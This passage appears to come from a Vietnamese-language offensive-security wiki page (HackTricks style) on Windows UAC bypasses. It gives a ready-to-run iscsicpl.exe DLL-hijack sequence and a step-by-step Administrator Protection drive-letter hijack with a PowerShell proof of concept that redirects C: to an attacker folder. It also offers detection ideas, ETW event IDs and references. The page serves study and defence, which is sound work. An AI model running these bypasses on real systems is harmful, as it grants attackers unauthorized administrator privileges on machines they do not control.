- Cách này hữu ích khi user hiện tại thuộc nhóm **Administrators** nhưng đang chạy ở mức **Medium Integrity** do UAC.
- Bản sao trong **SysWOW64** là bản cần dùng cho cách bypass này. Hãy xem bản sao trong **System32** là một binary riêng và kiểm tra hành vi của nó độc lập.
- Primitive này kết hợp **auto-elevation** và **DLL search-order hijacking**, vì vậy quy trình ProcMon tương tự các cách bypass UAC khác rất hữu ích để xác minh việc tải DLL bị thiếu.

Quy trình tối thiểu:

```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```

Ý tưởng phát hiện:
- Cảnh báo khi `reg add` / thao tác ghi registry vào `HKCU\Environment\Path` được theo ngay sau bởi việc thực thi `C:\Windows\SysWOW64\iscsicpl.exe`.
- Tìm `iscsiexe.dll` ở các vị trí **do người dùng kiểm soát**, chẳng hạn `%TEMP%` hoặc `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Đối chiếu các lần chạy `iscsicpl.exe` với tiến trình con bất thường hoặc DLL được tải từ bên ngoài các thư mục Windows thông thường.

### Nghiên cứu mới hơn cần kiểm tra riêng

Một số chuỗi khai thác sau năm 2024 không còn giống các kỹ thuật chiếm quyền registry `HKCU\Software\Classes` kinh điển. Ví dụ, kỹ thuật đầu độc activation-context cache có thể kết hợp **drive remap** và **DLL redirection** để nâng từ integrity trung bình lên cao thông qua các binary giao diện đáng tin cậy / tự động nâng quyền như `ctfmon.exe` và các mục tiêu về sau như `fodhelper.exe`. Thay vì lặp lại PoC lớn ở đây, hãy xem các ví dụ payload ngắn gọn trong:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Chiếm quyền drive-letter qua per-logon-session DOS device map trong Administrator Protection (preview)

> [!NOTE]
> Tính đến tháng 8 năm 2026, Microsoft vẫn ghi nhận Administrator Protection là **bản preview Insider**: đợt triển khai tháng 10 năm 2025 đã bị thu hồi và được lên kế hoạch phát hành vào một thời điểm sau đó. Hãy xác nhận **Admin Approval Mode with Administrator protection** thực sự được bật và thiết bị đã khởi động lại trước khi kiểm thử các chuỗi khai thác này; chỉ riêng chuỗi phiên bản 25H2 mặc định không chứng minh tính năng đang hoạt động.<sup>[[10]](#references)</sup>

Để biết toàn bộ bề mặt tấn công `RAiLaunchAdminProcess` / UIAccess trên các bản dựng preview Windows 11 25H2, xem trang chuyên biệt:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 “Administrator Protection” sử dụng token shadow-admin với các map `\Sessions\0\DosDevices/<LUID>` riêng theo từng phiên. Thư mục này được `SeGetTokenDeviceMap` tạo theo cơ chế lazy khi lần đầu phân giải `\??`. Nếu attacker mạo danh token shadow-admin ở mức **SecurityIdentification**, thư mục được tạo với attacker là **owner** (kế thừa `CREATOR OWNER`), cho phép các liên kết drive-letter được ưu tiên hơn `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Các bước:**

1. Từ một phiên có đặc quyền thấp, gọi `RAiProcessRunOnce` để khởi chạy `runonce.exe` shadow-admin mà không hiện prompt.
2. Sao chép token chính của tiến trình thành token **identification** và mạo danh token đó khi mở `\??` để buộc tạo `\Sessions\0\DosDevices/<LUID>` dưới quyền sở hữu của attacker.
3. Tạo symlink `C:` tại đó trỏ đến vùng lưu trữ do attacker kiểm soát; các lần truy cập hệ thống tệp tiếp theo trong phiên đó sẽ phân giải `C:` thành đường dẫn của attacker, cho phép chiếm quyền DLL/file mà không hiện prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```

Trên các máy chủ preview, Administrator Protection ghi nhận các lần phê duyệt và thất bại dưới dạng sự kiện ETW **15031** và **15032** thuộc provider `Microsoft-Windows-LUA`. Các sự kiện bao gồm SID của người yêu cầu, đường dẫn ứng dụng, kết quả, tài khoản quản trị viên được quản lý và phương thức xác thực, vì vậy các lần thử khai thác lặp lại hoặc điều khiển UI thất bại đều để lại telemetry.<sup>[[10]](#references)</sup>

```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```



## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Cách hoạt động của User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Bộ sưu tập kỹ thuật bypass UAC](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Công cụ quét khả năng tương thích và khởi chạy kỹ thuật bypass UAC](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI sử dụng AI để tạo backdoor PowerShell](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Chiến dịch TrueChaos: Khai thác lỗ hổng 0-day nhắm vào các mục tiêu chính phủ Đông Nam Á](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Bypass Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – Bypass UAC bằng tác vụ SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – Các kỹ thuật bypass Always Notify bằng UnifiedConsent, TabTip và Narrator](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Bảo vệ quản trị viên](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
- [11] [Google Project Zero – Gọi các máy chủ RPC cục bộ của Windows từ .NET](https://projectzero.google/2019/12/calling-local-windows-rpc-servers-from.html)
- [12] [Kaspersky Securelist – HoneyMyte nâng cấp CoolClient bằng rootkit kernel Windows có chữ ký số](https://securelist.com/honeymyte-coolclient-driver-rootkit/121028)
{{#include ../../banners/hacktricks-training.md}}
